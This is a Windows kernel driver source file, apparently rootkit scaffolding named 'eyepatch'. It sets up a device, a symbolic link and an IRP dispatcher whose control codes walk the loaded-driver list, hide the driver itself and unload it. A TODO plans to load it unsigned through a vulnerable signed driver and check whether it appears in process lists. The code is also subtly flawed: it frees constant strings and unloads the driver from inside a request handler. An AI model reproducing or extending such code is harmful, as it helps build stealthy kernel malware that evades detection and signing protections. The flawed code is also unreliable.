#include "includes.h"
#include "entry.h"
#include "driver_abuse.h"

// TODO: Load unsigned w/ vuln driver and see if driver in proclists (https://github.com/alxbrn/gdrv-loader)

UNICODE_STRING EYEPATCH_DEVICE_NAME = RTL_CONSTANT_STRING(L"\\Device\\eyepatch");
UNICODE_STRING EYEPATCH_SYMLINK_NAME = RTL_CONSTANT_STRING(L"\\??\\eyepatchlink");
DRIVER_OBJECT *selfDriverGlobal = nullptr;

// https://github.com/alxbrn/km-um-communication
NTSTATUS IRPDistpatch(DEVICE_OBJECT *device, IRP *irp) {
	UNREFERENCED_PARAMETER(device);
	NTSTATUS status = STATUS_SUCCESS;
	auto irpsp = IoGetCurrentIrpStackLocation(irp);
	DbgPrint("[IRPDistpatch] Called\n");

	irpsp->FileObject;

	switch (irpsp->MajorFunction) {
		case IRP_MJ_CREATE:
			DbgPrint("[IRPDistpatch] IRP_MJ_CREATE\n");
			break;
		case IRP_MJ_CLOSE:
			DbgPrint("[IRPDistpatch] IRP_MJ_CLOSE\n");
			break;
		case IRP_MJ_READ:
			DbgPrint("[IRPDistpatch] IRP_MJ_READ\n");
			break;
		case IRP_MJ_DEVICE_CONTROL:
			DbgPrint("[IRPDistpatch] IRP_MJ_DEVICE_CONTROL\n");
			switch (irpsp->Parameters.DeviceIoControl.IoControlCode) {
				case EYEPATCH_IOCTL_WALK_DRIVERS:
					crim::WalkDrivers();
					break;
				case EYEPATCH_IOCTL_HIDE_DRIVER:
					crim::HideDriver(selfDriverGlobal);
					break;
				case EYEPATCH_IOCTL_EXIT:
					DriverUnload(selfDriverGlobal);
					break;
				default:
					DbgPrint("[IRPDistpatch] Unknown IoControlCode: %d\n", irpsp->Parameters.DeviceIoControl.IoControlCode);
					break;
			}
			break;
		default:
			DbgPrint("[IRPDistpatch] Unknown MajorFunction: %d\n", irpsp->MajorFunction);
			break;
	}

	irp->IoStatus.Information = 0;
	irp->IoStatus.Status = status;
	IoCompleteRequest(irp, IO_NO_INCREMENT);

	DbgPrint("[IRPDistpatch] Return\n");
	return status;
}

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT driver, _In_ PUNICODE_STRING RegistryPath) {
	// Driver object
	DbgPrint("[DriverEntry] Loading driver, PDRIVER_OBJECT @ %p RegistryPath %wZ\n", driver, RegistryPath);
	driver->DriverUnload = DriverUnload;
	selfDriverGlobal = driver;

	// IOCTL
	PDEVICE_OBJECT deviceObject;
	auto status = IoCreateDevice(driver, 0, &EYEPATCH_DEVICE_NAME, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &deviceObject);

	if (!NT_SUCCESS(status)) {
		DbgPrint("[DriverEntry] IoCreateDevice failed\n");
		return status;
	}

	status = IoCreateSymbolicLink(&EYEPATCH_SYMLINK_NAME, &EYEPATCH_DEVICE_NAME);
	if (!NT_SUCCESS(status)) {
		DbgPrint("[DriverEntry] IoCreateSymbolicLink failed\n");
		return status;
	}

	for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) {
		driver->MajorFunction[i] = IRPDistpatch;
	}

	DbgPrint("[DriverEntry] Driver loaded\n");
	return STATUS_SUCCESS;
}

VOID DriverUnload(IN PDRIVER_OBJECT driver) {
	DbgPrint("[DriverUnload] Unloading driver, PDRIVER_OBJECT @ %p\n", driver);

	NTSTATUS status = IoDeleteSymbolicLink(&EYEPATCH_SYMLINK_NAME);
	if (!NT_SUCCESS(status)) {
		DbgPrint("[DriverUnload] IoDeleteSymbolicLink failed\n");
	}

	// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iodeletedevice
	// "When a driver calls IoDeleteDevice, the I/O manager deletes the target device object if there are
	// no outstanding references to it. However, if any outstanding references remain, the I/O manager marks
	// the device object as "delete pending" and deletes the device object when the references are released."
	// TODO: force close the user handle
	if (driver->DeviceObject != NULL) {
		IoDeleteDevice(driver->DeviceObject);
	}

	RtlFreeUnicodeString(&EYEPATCH_DEVICE_NAME);
	RtlFreeUnicodeString(&EYEPATCH_SYMLINK_NAME);

	DbgPrint("[DriverUnload] Driver unloaded\n");
}